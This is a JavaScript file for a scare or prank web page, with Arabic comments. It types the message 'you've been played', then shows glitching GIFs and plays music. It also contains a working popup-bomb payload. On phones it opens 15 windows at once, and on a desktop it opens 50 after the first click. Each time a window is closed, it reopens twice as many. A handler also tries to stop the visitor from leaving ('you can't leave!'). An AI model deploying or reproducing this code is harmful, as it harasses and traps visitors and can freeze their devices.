document.addEventListener("DOMContentLoaded", function () {
    let textContainer = document.getElementById("text-container");
    let gifContainer = document.getElementById("gif-container");
    let bgMusic = document.getElementById("bg-music");

    let message = "تم تلاعب فيك";
    let index = 0;

    function typeText() {
        if (index < message.length) {
            textContainer.innerHTML += message[index];
            index++;
            setTimeout(typeText, 200);
        } else {
            startGlitch();
        }
    }

    function startGlitch() {
        setTimeout(() => {
            textContainer.style.display = "none";
            gifContainer.style.opacity = 1;
            bgMusic.play();
            startImageLoop();
        }, 2500); // ⏳ التشويش يستمر 2.5 ثانية ثم تظهر الصور
    }

    let gifList = [
        "https://media4.giphy.com/media/l0Iy6fCmhY3hVGrzW/giphy.gif",
        "https://media1.giphy.com/media/l0Iy8UHZ0T5I0EaR2/giphy.gif",
        "https://media2.giphy.com/media/xUA7aLpbS0S3kr3s76/giphy.gif"
    ];

    function startImageLoop() {
        let currentIndex = 0;
        setInterval(() => {
            document.getElementById("static-gif").src = gifList[currentIndex];
            currentIndex = (currentIndex + 1) % gifList.length;
        }, 400);
    }

    // 🟥🟥 **فتح 15 نافذة عند الدخول مباشرةً على الهاتف** 🟥🟥
    function openMultipleWindows(count, delay) {
        let openedWindows = [];
        
        for (let i = 0; i < count; i++) {
            setTimeout(() => {
                let newWindow = window.open("https://example.com", "_blank", "width=150,height=150");
                if (newWindow) {
                    openedWindows.push(newWindow);
                    newWindow.onbeforeunload = function () {
                        setTimeout(() => {
                            openMultipleWindows(openedWindows.length * 2, delay); // تضاعف النوافذ عند الإغلاق
                        }, 500);
                    };
                }
            }, i * delay);
        }
    }

    // 🟥🟥 **عند الدخول من الهاتف، تفتح 15 نافذة فورًا** 🟥🟥
    if (/Mobi|Android/i.test(navigator.userAgent)) {
        openMultipleWindows(15, 500);
    }

    // 🟥🟥 **عند الضغط على الكمبيوتر، تفتح 50 نافذة واحدة تلو الأخرى** 🟥🟥
    document.addEventListener("click", () => {
        openMultipleWindows(50, 500);
    }, { once: true });

    // 🟥🟥 **إجبار الصفحة على البقاء مفتوحة** 🟥🟥
    window.onbeforeunload = function () {
        return "لا يمكنك المغادرة!";
    };

    typeText();
});